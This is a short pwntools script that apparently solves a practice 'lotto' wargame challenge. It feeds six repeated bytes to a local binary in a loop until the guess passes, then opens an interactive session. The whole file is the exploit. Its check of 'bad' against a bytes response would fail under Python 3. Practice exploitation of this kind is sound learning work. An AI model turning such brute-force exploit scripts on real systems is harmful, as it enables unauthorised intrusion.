from pwn import *

p = process("./lotto")

for i in range(1, 46):
    p.recvuntil(b"- Select Menu -\n");
    p.sendline(b"1")
    p.recvuntil(b"Submit your 6 lotto bytes : ")
    p.send((chr(i)*6).encode())
    p.recvline()
    res = p.recvline()
    if ("bad" in res):
        continue
    else:
        break
p.interactive()
